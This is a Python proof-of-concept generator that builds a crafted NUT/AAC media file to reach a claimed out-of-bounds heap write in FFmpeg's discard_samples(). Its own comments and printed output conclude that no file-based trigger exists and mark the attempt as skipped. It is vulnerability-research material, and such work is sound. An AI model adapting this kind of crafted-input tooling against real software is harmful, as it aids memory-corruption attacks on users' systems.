#!/usr/bin/env python3
"""
VULN 001 PoC Generator — OOB Heap Write in discard_samples()
CWE-787: Out-of-Bounds Write
Source: libavcodec/decode.c, function discard_samples() ~line 346

Vulnerability description:
  When AV_CODEC_FLAG2_SKIP_MANUAL is set and a frame already has
  AV_FRAME_DATA_SKIP_SAMPLES side data with size < 10, discard_samples()
  writes 10 bytes into that buffer without checking its actual size,
  causing an OOB heap write of up to 9 bytes.

Trigger prerequisites:
  1. AV_FRAME_DATA_SKIP_SAMPLES side data exists with size < 10
  2. AV_CODEC_FLAG2_SKIP_MANUAL flag set on the codec context
  3. avci->skip_samples > 0 (non-zero after codec open via avctx->delay)

This generator builds a minimal NUT/AAC file that exercises the
discard_samples code path via SM_DATA (SkipStart=100).

NOTE: The vulnerability CANNOT be triggered via any standard file-based path.
Every FFmpeg demuxer (NUT, Matroska, Ogg, CAF, IAMF, IMF, MP3, DTSHD,
and the generic demux.c path) hardcodes size=10 when creating
AV_PKT_DATA_SKIP_SAMPLES. The NUT SM_DATA reader (nutdec.c:read_sm_data)
always calls av_packet_new_side_data(pkt, AV_PKT_DATA_SKIP_SAMPLES, 10),
regardless of the SkipStart/SkipEnd values in the file.

Status: SKIPPED — no file-based trigger path exists.
"""

import struct
import os
import sys


# ---------------------------------------------------------------------------
# CRC32/BZIP2: poly=0x04C11DB7, non-reflected (MSB-first), init=0, no XOR
# This is the NUT container's checksum algorithm.
# Stored as struct.pack(">I", crc32_bzip2(content)) in the file.
# ---------------------------------------------------------------------------

def _make_crc_table():
    table = []
    for i in range(256):
        rem = i << 24
        for _ in range(8):
            if rem & 0x80000000:
                rem = ((rem << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                rem = (rem << 1) & 0xFFFFFFFF
        table.append(rem)
    return table


_CRC_TABLE = _make_crc_table()


def crc32_bzip2(data):
    crc = 0
    for b in data:
        idx = ((crc >> 24) ^ b) & 0xFF
        crc = ((crc << 8) ^ _CRC_TABLE[idx]) & 0xFFFFFFFF
    return crc


# ---------------------------------------------------------------------------
# NUT varlen encoding (ffio_read_varlen / put_v)
# MSB-first; bit7 of each byte is a continuation flag (1=more, 0=last).
# ---------------------------------------------------------------------------

def put_v(val):
    """Encode a non-negative integer as NUT varlen bytes."""
    assert val >= 0, "put_v requires non-negative integer"
    if val == 0:
        return b'\x00'
    groups = []
    while val > 0:
        groups.append(val & 0x7F)
        val >>= 7
    groups.reverse()
    return bytes(
        (g | 0x80) if i < len(groups) - 1 else g
        for i, g in enumerate(groups)
    )


def put_s(val):
    """Encode a signed integer as NUT varlen (put_v(2*|val| - (val>0)))."""
    raw = 2 * abs(val) - (1 if val > 0 else 0)
    return put_v(raw)


# ---------------------------------------------------------------------------
# NUT packet builder
# Structure: [BE64 startcode][varlen forward_ptr][content][BE32 CRC]
# forward_ptr = len(content) + 4  (includes the 4 CRC bytes)
# ---------------------------------------------------------------------------

def nut_packet(startcode, content):
    forward_ptr = len(content) + 4
    crc = struct.pack(">I", crc32_bzip2(content))
    return struct.pack(">Q", startcode) + put_v(forward_ptr) + content + crc


# ---------------------------------------------------------------------------
# NUT startcodes (from libavformat/nut.h)
# ---------------------------------------------------------------------------

MAIN_STARTCODE      = 0x4E4D7A561F5F04AD
STREAM_STARTCODE    = 0x4E5311405BF2F9DB
SYNCPOINT_STARTCODE = 0x4E4BE4ADEECA4569

# ---------------------------------------------------------------------------
# NUT ID string (file magic)
# ---------------------------------------------------------------------------

ID_STRING = b"nut/multimedia container\x00"

# ---------------------------------------------------------------------------
# MAIN_HEADER content (72 bytes)
#
# Encoding:
#   version=3, stream_count=1, max_distance=32767 (0x7FFF),
#   time_base_count=1, time_base[0]=1/44100
#   Frame code table: 256 entries (copied from FFmpeg-generated NUT AAC file)
#   Elision headers: 6 headers (0-length default + 5 common AAC prefixes)
#
# Frame code table summary (for decoding reference):
#   code[0]  = FLAG_INVALID
#   code[1]  = FLAG_CODED, pts_delta=1, size_mul=1   ← used for SM_DATA frame
#   code[2]  = FLAG_SIZE_MSB|FLAG_CODED_PTS, pts=0, mul=1
#   code[3]  = FLAG_KEY|FLAG_SIZE_MSB|FLAG_CODED_PTS, pts=0, mul=1
#   code[4-5]= FLAG_KEY, pts=0, mul=2
#   code[6-7]= FLAG_KEY, pts=1, mul=2
#   code[8-253] = FLAG_KEY|FLAG_SIZE_MSB, pts=1, mul=246 (large frames)
#   code[254-255] = FLAG_INVALID
# ---------------------------------------------------------------------------

MAIN_HEADER_CONTENT = bytes([
    0x03, 0x01, 0x81, 0xFF, 0x7F, 0x01, 0x01, 0x82, 0xD8, 0x44,  # 0-9
    0xC0, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xA0,  # 10-19
    0x00, 0x02, 0x01, 0x01, 0x28, 0x01, 0x00, 0x29, 0x00, 0x01,  # 20-29
    0x02, 0x00, 0x02, 0x01, 0x01, 0x01, 0x21, 0x02, 0x01, 0x81,  # 30-39
    0x76, 0xC0, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,  # 40-49
    0x06, 0x03, 0x00, 0x00, 0x01, 0x04, 0x00, 0x00, 0x01, 0xB6,  # 50-59
    0x02, 0xFF, 0xFA, 0x02, 0xFF, 0xFB, 0x02, 0xFF, 0xFC, 0x02,  # 60-69
    0xFF, 0xFD,                                                    # 70-71
])
assert len(MAIN_HEADER_CONTENT) == 72, f"bad main header: {len(MAIN_HEADER_CONTENT)}"

# ---------------------------------------------------------------------------
# STREAM_HEADER content (25 bytes)
#
# stream_id=0, class=1 (audio), fourcc_len=4, codec_tag=0x000000FF (AAC),
# time_base_id=0, msb_pts_shift=14, max_pts_distance=44100,
# decode_delay=0, stream_flags=0,
# extradata_size=5, extradata=[0x12,0x08,0x56,0xE5,0x00] (AudioSpecificConfig),
# sample_rate=44100, samplerate_den=0, nb_channels=1
# ---------------------------------------------------------------------------

STREAM_HEADER_CONTENT = bytes([
    0x00,                          # stream_id=0
    0x01,                          # class=1 (audio)
    0x04,                          # fourcc_len=4
    0xFF, 0x00, 0x00, 0x00,        # codec_tag=0x000000FF (NUT tag for AAC)
    0x00,                          # time_base_id=0
    0x0E,                          # msb_pts_shift=14
    0x82, 0xD8, 0x44,              # max_pts_distance=44100 (varlen)
    0x00,                          # decode_delay=0
    0x00,                          # stream_flags=0 (discarded by demuxer)
    0x05,                          # extradata_size=5
    0x12, 0x08, 0x56, 0xE5, 0x00, # AudioSpecificConfig (mono 44100Hz AAC-LC + ext)
    0x82, 0xD8, 0x44,              # sample_rate=44100 (varlen)
    0x00,                          # samplerate_den=0 (discarded)
    0x01,                          # nb_channels=1
])
assert len(STREAM_HEADER_CONTENT) == 25, f"bad stream header: {len(STREAM_HEADER_CONTENT)}"

# ---------------------------------------------------------------------------
# SYNCPOINT content (2 bytes)
# timestamp=0 (time_base_id=0, pts=0), back_ptr_delta=0
# CRC32_BZIP2([0x00,0x00]) = 0 → stored as [0x00,0x00,0x00,0x00]
# ---------------------------------------------------------------------------

SYNCPOINT_CONTENT = bytes([0x00, 0x00])


# ---------------------------------------------------------------------------
# SM_DATA builder
#
# NUT SM_DATA carries "SkipStart" (and optionally "SkipEnd") key-value pairs.
# read_sm_data() in nutdec.c reads these and calls:
#   av_packet_new_side_data(pkt, AV_PKT_DATA_SKIP_SAMPLES, 10)
# with HARDCODED size=10 — the vulnerability requires size<10 which is IMPOSSIBLE
# to achieve through any standard NUT (or other) demuxer path.
#
# On-wire format (two consecutive calls: is_meta=0 then is_meta=1):
#   is_meta=0: varlen(count) + [varlen(name_len) + name_bytes + put_s(value)] * count
#   is_meta=1: varlen(count) + ... (count=0 → single 0x00 byte)
# ---------------------------------------------------------------------------

def build_sm_data(skip_start):
    """Return SM_DATA bytes for SkipStart=skip_start, SkipEnd=0."""
    # is_meta=0 section: count=1, name="SkipStart", value=skip_start
    name = b"SkipStart"
    sm0 = put_v(1) + put_v(len(name)) + name + put_s(skip_start)
    # is_meta=1 section: count=0
    sm1 = put_v(0)
    return sm0 + sm1


# ---------------------------------------------------------------------------
# Minimal silent raw AAC-LC mono frame (4 bytes, no ADTS header)
#
# Bit layout (32 bits total, packed MSB-first):
#   000        ID_SCE  (single_channel_element, 3 bits)
#   0000       element_instance_tag (4 bits)
#   0          ics_reserved_bit (1 bit)
#   00         window_sequence = ONLY_LONG_SEQUENCE (2 bits)
#   0          window_shape (1 bit)
#   000000     max_sfb=0 (6 bits) → no scale-factor bands → no spectral data
#   0          predictor_data_present=0 (1 bit)
#   00000000   global_gain=0 (8 bits)
#   0          pulse_data_present=0 (1 bit)
#   0          tns_data_present=0 (1 bit)
#   0          gain_control_data_present=0 (1 bit)
#   111        ID_END (3 bits)
# → 0x00 0x00 0x00 0x07
# ---------------------------------------------------------------------------

AAC_SILENCE_FRAME = bytes([0x00, 0x00, 0x00, 0x07])


# ---------------------------------------------------------------------------
# Frame builder
#
# Uses frame_code=1 (FLAG_CODED entry; size_mul=1, size_lsb=0).
# coded_flags XOR with FLAG_CODED(4096) yields target_flags=313:
#   FLAG_SM_DATA(256) | FLAG_SIZE_MSB(32) | FLAG_STREAM_ID(16) |
#   FLAG_CODED_PTS(8) | FLAG_KEY(1) = 313
# coded_flags_val = 313 ^ 4096 = 4409
#
# Frame header bytes:
#   0x01            frame_code=1
#   varlen(4409)    coded_flags = [0xA2, 0x39]
#   varlen(0)       stream_id=0
#   varlen(0)       coded_pts=0 (→ pts=0 via ff_lsb2full with last_pts=0)
#   varlen(size)    size_msb (size_mul=1, so total frame data = this value)
# ---------------------------------------------------------------------------

FLAG_CODED     = 4096
FLAG_KEY       = 1
FLAG_CODED_PTS = 8
FLAG_STREAM_ID = 16
FLAG_SIZE_MSB  = 32
FLAG_SM_DATA   = 256
TARGET_FLAGS   = FLAG_KEY | FLAG_CODED_PTS | FLAG_STREAM_ID | FLAG_SIZE_MSB | FLAG_SM_DATA


def build_frame(skip_start=100):
    sm_data = build_sm_data(skip_start)
    frame_data = sm_data + AAC_SILENCE_FRAME
    data_size = len(frame_data)

    coded_flags_val = TARGET_FLAGS ^ FLAG_CODED  # = 4409

    frame_header = (
        bytes([0x01])          # frame_code=1
        + put_v(coded_flags_val)  # coded_flags
        + put_v(0)             # stream_id=0
        + put_v(0)             # coded_pts=0
        + put_v(data_size)     # size_msb (= total frame data bytes)
    )
    return frame_header + frame_data


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, "vuln_001_input.nut")

    # Build NUT file
    frame = build_frame(skip_start=100)
    sm_data_size = len(build_sm_data(100))

    buf = (
        ID_STRING
        + nut_packet(MAIN_STARTCODE,      MAIN_HEADER_CONTENT)
        + nut_packet(STREAM_STARTCODE,    STREAM_HEADER_CONTENT)
        + nut_packet(SYNCPOINT_STARTCODE, SYNCPOINT_CONTENT)
        + frame
    )

    with open(out_path, "wb") as f:
        f.write(buf)

    print(f"[+] Output: {out_path} ({len(buf)} bytes)")
    print(f"[+] SM_DATA size in file: {sm_data_size} bytes (SkipStart=100)")
    print(f"[+] Frame data size: {len(frame)} bytes")
    print()
    print("[!] VULNERABILITY ANALYSIS:")
    print("    read_sm_data() in nutdec.c ALWAYS calls:")
    print("      av_packet_new_side_data(pkt, AV_PKT_DATA_SKIP_SAMPLES, 10)")
    print("    with hardcoded size=10, regardless of SkipStart/SkipEnd values.")
    print()
    print("    The OOB in discard_samples() (decode.c:346) requires")
    print("    AV_FRAME_DATA_SKIP_SAMPLES with size < 10.")
    print()
    print("    There is NO file-based path to produce size < 10.")
    print("    All FFmpeg demuxers hardcode size=10 for SKIP_SAMPLES.")
    print()
    print("[!] STATUS: SKIPPED — trigger not achievable via file-based method.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
